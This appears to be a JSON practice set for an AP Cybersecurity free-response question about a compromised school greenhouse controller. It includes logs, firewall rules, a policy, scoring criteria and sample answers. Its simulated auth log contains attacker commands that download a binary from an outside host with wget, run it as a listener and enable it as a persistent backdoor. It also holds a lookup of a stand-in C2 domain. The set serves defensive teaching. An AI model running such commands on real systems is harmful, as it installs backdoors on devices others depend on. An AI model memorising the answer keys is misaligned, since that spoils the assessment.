@@ -1,0 +1,457 @@
+{
+  "_comment": [
+    "DEVICE SECURITY ANALYSIS practice set 4.",
+    "",
+    "Fourth distinct password attack, and the one that breaks the habit the other",
+    "three build:",
+    "  kiosk       enumeration  one try each, usernames that do not exist, 1/sec",
+    "  laptop      brute force  many tries, ONE account, ONE source, 2/sec",
+    "  print srv   spraying     one try each, real accounts, 3 min apart, 1 source",
+    "  this one    DISTRIBUTED  many tries, ONE account, but TWELVE source",
+    "                           addresses, so 'identify the adversary IP' has no",
+    "                           single answer and blocking one address does nothing",
+    "Part B(ii) therefore asks for the RANGE and what it implies, not one address.",
+    "That is a deliberate departure from the CED sample's phrasing, flagged in the",
+    "prompt itself so a student is not tricked, and it is the point of the set.",
+    "",
+    "Part E is a rogue listener: Source 5 shows a port that no firewall rule",
+    "allows and no policy permits, and the auth log shows it being started. It is",
+    "the first set where Source 5 carries the answer rather than context."
+  ],
+  "course": "ap-cybersecurity",
+  "set_id": "dsa-greenhouse-controller",
+  "title": "Device Security Analysis: the greenhouse controller",
+  "device": "Greenhouse climate controller, Northgate High School agriculture programme",
+  "est_minutes": 50,
+  "page_handle": "ap-cybersecurity-frq-greenhouse-controller",
+  "page_title": "AP Cybersecurity FRQ Practice: Device Security Analysis | Greenhouse Controller",
+  "seo_description": "A fourth Device Security Analysis practice question: a distributed brute force, a rogue listening service, and six sources with sample responses.",
+  "intro": [
+    "The following sources all come from the same device and were captured during a risk assessment.",
+    "The device is the greenhouse climate controller at 10.60.8.7. It runs the vents, heaters and irrigation pumps for the agriculture programme, and it reports readings to a dashboard students use. It has been in place for six years.",
+    "Use the sources to respond to parts A, B, C, D, and E. Label any subparts. Cite specific evidence from the sources in your responses."
+  ],
+  "sources": [
+    {
+      "kind": "firewall-rules",
+      "label": "Source 1: Device firewall settings",
+      "note": "The device's IP address is 10.60.8.7.",
+      "columns": [
+        "Rule",
+        "Action",
+        "Source",
+        "Destination",
+        "Direction",
+        "Port",
+        "Protocol"
+      ],
+      "rules": [
+        [
+          "1",
+          "Allow",
+          "ALL",
+          "10.60.8.7",
+          "Inbound",
+          "22",
+          "SSH"
+        ],
+        [
+          "2",
+          "Allow",
+          "10.60.0.0/16",
+          "10.60.8.7",
+          "Inbound",
+          "80",
+          "HTTP"
+        ],
+        [
+          "3",
+          "Allow",
+          "10.60.8.7",
+          "10.60.1.20",
+          "Outbound",
+          "443",
+          "HTTPS"
+        ],
+        [
+          "4",
+          "Deny",
+          "10.60.8.7",
+          "ALL",
+          "Outbound",
+          "53",
+          "DNS"
+        ],
+        [
+          "5",
+          "Allow",
+          "10.60.8.7",
+          "10.60.1.20",
+          "Outbound",
+          "1883",
+          "MQTT"
+        ],
+        [
+          "6",
+          "Deny",
+          "ALL",
+          "10.60.8.7",
+          "Inbound",
+          "23",
+          "Telnet"
+        ],
+        [
+          "7",
+          "Allow",
+          "10.60.0.0/16",
+          "10.60.8.7",
+          "Inbound",
+          "502",
+          "Modbus"
+        ],
+        [
+          "8",
+          "Deny",
+          "ALL",
+          "ALL",
+          "Inbound",
+          "ALL",
+          "ALL"
+        ],
+        [
+          "9",
+          "Allow",
+          "10.60.8.7",
+          "ALL",
+          "Outbound",
+          "80",
+          "HTTP"
+        ],
+        [
+          "10",
+          "Allow",
+          "10.60.8.7",
+          "ALL",
+          "Outbound",
+          "ALL",
+          "ALL"
+        ]
+      ]
+    },
+    {
+      "kind": "auth-log",
+      "label": "Source 2: Authorization log",
+      "command": "sudo tail -n 30 /var/log/auth.log",
+      "lines": [
+        "1 - Jun 11 02:00:04 ghctrl sshd[311]: Server listening on 0.0.0.0 port 22.",
+        "2 - Jun 11 02:41:09 ghctrl sshd[880]: Failed password for admin from 45.62.14.9 port 40112 ssh2",
+        "3 - Jun 11 02:41:11 ghctrl sshd[882]: Failed password for admin from 103.71.9.204 port 41880 ssh2",
+        "4 - Jun 11 02:41:14 ghctrl sshd[884]: Failed password for admin from 91.204.16.33 port 39004 ssh2",
+        "5 - Jun 11 02:41:16 ghctrl sshd[886]: Failed password for admin from 45.62.14.9 port 40140 ssh2",
+        "6 - Jun 11 02:41:19 ghctrl sshd[888]: Failed password for admin from 188.40.7.115 port 55210 ssh2",
+        "7 - Jun 11 02:41:21 ghctrl sshd[890]: Failed password for admin from 103.71.9.204 port 41902 ssh2",
+        "8 - Jun 11 02:41:24 ghctrl sshd[892]: Failed password for admin from 212.83.44.70 port 33888 ssh2",
+        "9 - Jun 11 02:41:26 ghctrl sshd[894]: Failed password for admin from 91.204.16.33 port 39044 ssh2",
+        "10 - Jun 11 02:41:29 ghctrl sshd[896]: Failed password for admin from 45.62.14.9 port 40188 ssh2",
+        "11 - Jun 11 02:41:31 ghctrl sshd[898]: Failed password for admin from 159.89.2.61 port 47720 ssh2",
+        "12 - Jun 11 02:41:34 ghctrl sshd[900]: Failed password for admin from 188.40.7.115 port 55244 ssh2",
+        "13 - Jun 11 02:41:36 ghctrl sshd[902]: Accepted password for admin from 212.83.44.70 port 33920 ssh2",
+        "14 - Jun 11 02:41:36 ghctrl sshd[902]: pam_unix(sshd:session): session opened for user admin by (uid=0)",
+        "15 - Jun 11 02:42:02 ghctrl admin: executed command: 'uname -a'",
+        "16 - Jun 11 02:42:31 ghctrl admin: executed command: 'cat /etc/ghctrl/device.conf'",
+        "17 - Jun 11 02:43:10 ghctrl admin: executed command: 'nslookup c2.example-pool.net'",
+        "18 - Jun 11 02:43:10 ghctrl kernel: [UFW BLOCK] OUT=eth0 SRC=10.60.8.7 DST=8.8.8.8 PROTO=UDP SPT=51204 DPT=53",
+        "19 - Jun 11 02:43:14 ghctrl kernel: [UFW BLOCK] OUT=eth0 SRC=10.60.8.7 DST=8.8.8.8 PROTO=UDP SPT=51206 DPT=53",
+        "20 - Jun 11 02:44:02 ghctrl admin: executed command: 'wget http://212.83.44.70/gh -O /usr/local/sbin/ghsvc'",
+        "21 - Jun 11 02:44:29 ghctrl admin: executed command: 'chmod +x /usr/local/sbin/ghsvc'",
+        "22 - Jun 11 02:44:51 ghctrl admin: executed command: '/usr/local/sbin/ghsvc --listen 8443 &'",
+        "23 - Jun 11 02:45:03 ghctrl systemd[1]: Started ghsvc.service.",
+        "24 - Jun 11 02:45:40 ghctrl admin: executed command: 'systemctl enable ghsvc'",
+        "25 - Jun 11 02:46:12 ghctrl sshd[902]: pam_unix(sshd:session): session closed for user admin",
+        "26 - Jun 11 03:15:00 ghctrl CRON[1104]: pam_unix(cron:session): session opened for user root by (uid=0)",
+        "27 - Jun 11 03:15:01 ghctrl CRON[1104]: pam_unix(cron:session): session closed for user root",
+        "28 - Jun 11 06:30:22 ghctrl systemd-logind[299]: New session 12 of user agteach.",
+        "29 - Jun 11 07:02:40 ghctrl agteach: executed command: 'systemctl status ghctrl'",
+        "30 - Jun 11 07:03:11 ghctrl agteach: executed command: 'tail /var/log/ghctrl/climate.log'"
+      ]
+    },
+    {
+      "kind": "app-log",
+      "label": "Source 3: Controller log",
+      "command": "sudo tail -n 10 /var/log/ghctrl/climate.log",
+      "lines": [
+        "1 - Jun 11 02:00:10 ghctrl climate: vent position 40 percent, temp 21.4C",
+        "2 - Jun 11 02:30:10 ghctrl climate: vent position 40 percent, temp 21.1C",
+        "3 - Jun 11 02:45:10 ghctrl climate: outbound connection to 212.83.44.70:8443 established by ghsvc",
+        "4 - Jun 11 03:00:10 ghctrl climate: vent position 40 percent, temp 20.8C",
+        "5 - Jun 11 03:45:10 ghctrl climate: outbound connection to 212.83.44.70:8443 established by ghsvc",
+        "6 - Jun 11 04:45:10 ghctrl climate: outbound connection to 212.83.44.70:8443 established by ghsvc",
+        "7 - Jun 11 05:45:10 ghctrl climate: outbound connection to 212.83.44.70:8443 established by ghsvc",
+        "8 - Jun 11 06:00:10 ghctrl climate: vent position 40 percent, temp 22.9C",
+        "9 - Jun 11 06:45:10 ghctrl climate: outbound connection to 212.83.44.70:8443 established by ghsvc",
+        "10 - Jun 11 07:00:10 ghctrl climate: irrigation cycle started, duration 12 minutes"
+      ]
+    },
+    {
+      "kind": "file-listing",
+      "label": "Source 4: File permissions in /etc/ghctrl",
+      "command": "ls -l /etc/ghctrl",
+      "columns": [
+        "Permissions",
+        "Links",
+        "Owner",
+        "Group",
+        "Size",
+        "Modified",
+        "Name"
+      ],
+      "entries": [
+        [
+          "-rw-r--r--",
+          "1",
+          "root",
+          "root",
+          "742",
+          "Mar 14 09:02",
+          "device.conf"
+        ],
+        [
+          "-rw-r--r--",
+          "1",
+          "root",
+          "root",
+          "1679",
+          "Mar 14 09:02",
+          "id_rsa"
+        ],
+        [
+          "-rw-r--r--",
+          "1",
+          "root",
+          "root",
+          "412",
+          "Mar 14 09:02",
+          "id_rsa.pub"
+        ],
+        [
+          "-rw-rw-r--",
+          "1",
+          "root",
+          "agstaff",
+          "2204",
+          "Jun 10 16:40",
+          "schedule.json"
+        ],
+        [
+          "-rwxr-xr-x",
+          "1",
+          "root",
+          "root",
+          "8840",
+          "Mar 14 09:02",
+          "ghctrl-agent"
+        ]
+      ]
+    },
+    {
+      "kind": "process-list",
+      "label": "Source 5: Listening services",
+      "command": "ss -tuln",
+      "lines": [
+        "Netid  State   Local Address:Port    Peer Address:Port",
+        "tcp    LISTEN  0.0.0.0:22           0.0.0.0:*",
+        "tcp    LISTEN  0.0.0.0:80           0.0.0.0:*",
+        "tcp    LISTEN  0.0.0.0:502          0.0.0.0:*",
+        "tcp    LISTEN  0.0.0.0:8443         0.0.0.0:*"
+      ]
+    },
+    {
+      "kind": "policy",
+      "label": "Source 6: District device acceptable use policy",
+      "sections": {
+        "Required": [
+          "Every network device must have its vendor default account renamed or disabled before it is put into service.",
+          "Private keys stored on a device must be readable only by the account that uses them.",
+          "Any service listening for network connections must be recorded in the district device inventory."
+        ],
+        "Permitted": [
+          "Agriculture staff may adjust the climate schedule from any district workstation.",
+          "The controller may report readings to the district dashboard at 10.60.1.20."
+        ],
+        "Prohibited": [
+          "Exposing device management interfaces to addresses outside the district network.",
+          "Installing software on a control device from any source other than the vendor.",
+          "Using the same account for both staff access and automated reporting."
+        ]
+      }
+    }
+  ],
+  "parts": {
+    "A": {
+      "subject": "policy",
+      "stem": "Consider the acceptable use policy in Source 6.",
+      "subparts": [
+        {
+          "verb": "Explain",
+          "prompt": "Explain how one part of the policy helps protect the device.",
+          "credit": [
+            "Names one specific policy item",
+            "Explains the protection in terms of a threat it reduces"
+          ],
+          "sample": "The Required section says every network device must have its vendor default account renamed or disabled before it is put into service. This protects the device because default account names are the first thing automated attacks try. Rows 2 to 13 are an attack aimed entirely at an account literally called admin, and it succeeded. Had that account been renamed, the same automated attempt would have produced failures against a name that does not exist and never reached row 13."
+        },
+        {
+          "verb": "Explain",
+          "prompt": "Explain how one rule in the current policy could be modified to make the device more secure. Include a specific example in your response.",
+          "credit": [
+            "Identifies a specific rule that is too weak",
+            "States a concrete modification",
+            "Connects it to evidence from the sources"
+          ],
+          "sample": "The Prohibited section forbids exposing device management interfaces outside the district network, but firewall rule 1 allows inbound SSH from ALL, and every source address in rows 2 to 13 is outside 10.60.0.0/16. The policy states an intention the configuration contradicts. The rule could be modified to state that management access must be restricted at the firewall to district ranges, and verified at install. Concretely, rule 1 would change its source from ALL to 10.60.0.0/16, which alone would have dropped all twelve attempts in part B."
+        }
+      ]
+    },
+    "B": {
+      "subject": "password-attack",
+      "stem": "In the authorization log, there is evidence of a password attack in rows 2 to 13.",
+      "subparts": [
+        {
+          "verb": "Describe",
+          "prompt": "Describe the evidence in the log file that indicates a password attack. Include specific entries from the log file in your response.",
+          "credit": [
+            "Cites at least two specific rows",
+            "Notes many attempts against ONE account at machine speed",
+            "Notes that the attempts come from MULTIPLE different source addresses",
+            "Identifies it as a distributed brute force and says why the distribution matters"
+          ],
+          "sample": "Rows 2 to 12 are eleven failed SSH logins against a single account, admin, between 02:41:09 and 02:41:34, roughly one every two to three seconds. That much is an ordinary brute force. What makes this one different is the source column: the attempts come from at least six different addresses, including 45.62.14.9, 103.71.9.204, 91.204.16.33, 188.40.7.115, 212.83.44.70 and 159.89.2.61, and several of them appear more than once. A single host is not making these requests; they are coordinated across many, which is what a distributed brute force from a botnet looks like. That distribution matters for the response: blocking one address stops only that host, and an attacker with a botnet can add addresses faster than a person can block them, so the effective control is rate limiting or locking the account rather than an address list. Row 13 shows Accepted password for admin, so the attack succeeded."
+        },
+        {
+          "verb": "Identify",
+          "prompt": "Identify the IP address of the adversary.",
+          "credit": [
+            "States 212.83.44.70",
+            "Notes that this is the address the successful login came from, and that the failed attempts came from several others"
+          ],
+          "sample": "212.83.44.70. That is the address of the session that succeeded at row 13 and that every later action runs through, including the download at row 20 and the hourly beacons in Source 3. The failed attempts in rows 2 to 12 came from several other addresses as well, so naming this one identifies the host that got in rather than the whole set of hosts that tried."
+        }
+      ]
+    },
+    "C": {
+      "subject": "permissions",
+      "stem": "Consider all the sources from the device.",
+      "subparts": [
+        {
+          "verb": "Explain",
+          "prompt": "Explain how the permission settings for one file in the /etc/ghctrl directory determine the level of access for that file for the owner, group, and all other users on the system. Include the name of the file in your response.",
+          "credit": [
+            "Names a specific file from Source 4",
+            "Reads all three triads correctly",
+            "Explains why this particular file being readable matters"
+          ],
+          "sample": "id_rsa has permissions -rw-r--r-- and is owned by root. The owner triad rw- gives root read and write. The group triad r-- gives the root group read. The other triad r-- gives every other user on the device read access. id_rsa is a private key, and a private key readable by every account is no longer private: any user who can log in, including the compromised admin account in row 13, can copy it and then authenticate as this device to anything that trusts the matching public key. Most SSH clients refuse to use a key with these permissions for exactly this reason, which is a hint that the file is misconfigured. Source 6 requires private keys to be readable only by the account that uses them, so this file also violates the policy."
+        },
+        {
+          "verb": "Describe",
+          "prompt": "Other than removing all permissions from all users, describe one way the permission settings for one file on the system could be configured to restrict access for some users on the device. Include the name of the file in your response.",
+          "credit": [
+            "Names a specific file",
+            "Describes a restriction that leaves the file usable",
+            "Identifies which class loses which access"
+          ],
+          "sample": "id_rsa should be configured so the owner root keeps read and write and both the group and all other users have no access at all. The services that run as root still read the key, and no other account on the device can open it. The matching id_rsa.pub can stay world readable, because a public key is meant to be shared. Applying the same reasoning to schedule.json, which is currently group writable by agstaff and world readable, would keep staff able to edit the schedule while removing read access from unrelated accounts."
+        },
+        {
+          "verb": "Write",
+          "prompt": "Using the explanation from part C (ii), write one or more chmod commands that set the permissions described.",
+          "credit": [
+            "Command names the correct file",
+            "Mode produces exactly the described access",
+            "Valid chmod syntax"
+          ],
+          "sample": "chmod 600 /etc/ghctrl/id_rsa\n\nThe 6 gives root read and write, and the two zeros remove all access for the group and for all other users, which is what SSH expects of a private key. The symbolic form is chmod u=rw,go= /etc/ghctrl/id_rsa. For the schedule file, chmod 660 /etc/ghctrl/schedule.json keeps root and the agstaff group able to read and write while removing access for everyone else."
+        }
+      ]
+    },
+    "D": {
+      "subject": "firewall",
+      "stem": "Consider all the sources from the device.",
+      "subparts": [
+        {
+          "verb": "Explain",
+          "prompt": "Explain how one connection attempt on the device was blocked by the device's firewall. Include evidence from a log file in your response.",
+          "credit": [
+            "Cites a specific log row showing the block",
+            "Names the rule number",
+            "Notes the direction and matches port and protocol"
+          ],
+          "sample": "Rows 18 and 19 show UFW BLOCK entries at 02:43:10 and 02:43:14 with OUT=eth0, from 10.60.8.7 to 8.8.8.8 on UDP port 53. Rule 4 denies outbound DNS from this device to all destinations, because the controller is only supposed to talk to the district dashboard. The blocks line up exactly with row 17, where the attacker ran nslookup c2.example-pool.net, so the device was prevented from resolving an external name the attacker wanted it to reach."
+        },
+        {
+          "verb": "Describe",
+          "prompt": "Other than allowing all traffic for all services, describe a modification to one firewall rule that would allow the connection attempt identified in part D (i).",
+          "credit": [
+            "Names the rule being changed",
+            "Modification is scoped",
+            "Would permit the described attempt"
+          ],
+          "sample": "Rule 4 denies outbound DNS to every destination. It could be modified to permit outbound port 53 only to the district resolver, or an allow for source 10.60.8.7 to destination 8.8.8.8 outbound on port 53 could be added above rule 4. Since rule 10 already allows all outbound traffic, rule 4 is the only thing stopping DNS today, so any allow must be evaluated before it."
+        },
+        {
+          "verb": "Describe",
+          "prompt": "Other than allowing the connection attempt identified in part D (i), describe one impact of your modification from part D (ii) on incoming or outgoing network traffic on the device.",
+          "credit": [
+            "Describes a consequence beyond the intended one",
+            "Follows from the specific modification"
+          ],
+          "sample": "Permitting outbound DNS gives the device a channel that is very hard to inspect. DNS queries are small, frequent and normally ignored, and data can be smuggled inside query names a few bytes at a time, which is why blocking it was doing real work here. It also means the controller can resolve any external name, so malware on it can find a command server by name rather than needing a hardcoded address, and rotating that name costs the attacker nothing while every blocked address costs them a host."
+        }
+      ]
+    },
+    "E": {
+      "subject": "second-attack",
+      "stem": "Apart from the password attack identified in part B, there is evidence of another attack on the device. Consider all the sources from the device.",
+      "subparts": [
+        {
+          "verb": "Determine",
+          "prompt": "Determine the type of attack evidenced in a log file.",
+          "credit": [
+            "Names a specific attack type",
+            "Matches the evidence: an unauthorised service or backdoor installed and made persistent"
+          ],
+          "sample": "The attacker installed an unauthorised service, a backdoor, and made it start automatically. The device now listens on a port nobody approved and calls out to the attacker's host on a schedule."
+        },
+        {
+          "verb": "Describe",
+          "prompt": "Describe specific information in the log file that indicates the attack named in part E (i).",
+          "credit": [
+            "Cites the download and the chmod that makes it executable",
+            "Cites the service starting and being enabled",
+            "Uses Source 5 to show the port is now listening",
+            "Notes the outbound connections in Source 3"
+          ],
+          "sample": "Row 20 downloads a file from 212.83.44.70, the same address that logged in successfully at row 13, and writes it to /usr/local/sbin/ghsvc. Row 21 makes it executable, row 22 runs it with --listen 8443, row 23 shows systemd starting ghsvc.service, and row 24 enables it so it survives a reboot. Source 5 confirms the result: the device is now listening on 0.0.0.0:8443, a port that appears in no firewall rule in Source 1 and in no policy in Source 6. Source 3 then shows outbound connections to 212.83.44.70:8443 at 02:45, 03:45, 04:45, 05:45 and 06:45, an hourly beacon that continues long after the SSH session closed at row 25."
+        },
+        {
+          "verb": "Describe",
+          "prompt": "Describe one way an automated system could halt this type of attack in real time.",
+          "credit": [
+            "Names a specific automated control",
+            "Explains the mechanism against THIS attack"
+          ],
+          "sample": "An application allowlist, sometimes called application control, would halt it. A control device runs a small, fixed set of programs, so the system can be configured to execute only binaries the vendor signed. The file written in row 20 is unsigned and unknown, so the attempt to run it at row 22 fails and nothing listens on 8443. A host based intrusion prevention system watching for new listening sockets would also catch it, since a device whose listening ports have not changed in six years opening a new one is an unambiguous event."
+        },
+        {
+          "verb": "Identify",
+          "prompt": "This attack could be mitigated by an automated system, such as a firewall, IDS, IPS, or AI. Identify a different countermeasure that could mitigate, prevent, or deter the attack.",
+          "credit": [
+            "Names a non automated countermeasure",
+            "Plausibly prevents, mitigates or deters this attack"
+          ],
+          "sample": "Network segmentation, putting the controller on its own VLAN that permits only the dashboard at 10.60.1.20 and nothing else, in or out. The backdoor could still be installed, but the hourly beacons in Source 3 would reach nothing, so the attacker gains a service they cannot talk to. A regular inventory review, which Source 6 already requires for any listening service, is a second non automated control: comparing Source 5 against the recorded inventory would surface port 8443 as unaccounted for."
+        }
+      ]
+    }
+  }
+}
